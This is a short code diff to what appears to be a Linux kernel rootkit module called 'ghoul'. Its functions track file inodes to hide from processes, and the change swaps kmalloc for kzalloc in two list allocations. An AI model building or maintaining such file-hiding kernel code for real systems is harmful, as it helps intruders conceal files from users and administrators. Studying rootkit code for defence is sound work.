@@ -14,7 +14,7 @@ void hide_file_inode(unsigned long ino)
 
     pr_info("ghoul: hiding inode %lu\n", ino);
 
-    inode_entry = kmalloc(sizeof(struct inode_list), GFP_KERNEL);
+    inode_entry = kzalloc(sizeof(struct inode_list), GFP_KERNEL);
     inode_entry->ino = ino;
     INIT_LIST_HEAD(&inode_entry->excluded_pids);
     list_add_tail(&inode_entry->list, &inodes_to_hide);
@@ -82,7 +82,7 @@ void show_file_inode(const void __user *user_info)
     // show inode to a specific PID - add PID to excluded PIDs list
     else {
         pr_info("ghoul: showing inode %lu for PID %d\n", info.ino, info.pid);
-        excluded_pid = kmalloc(sizeof(struct pid_list), GFP_KERNEL);
+        excluded_pid = kzalloc(sizeof(struct pid_list), GFP_KERNEL);
         excluded_pid->pid = info.pid;
         list_add_tail(&excluded_pid->list, &hidden_inode->excluded_pids);
     }
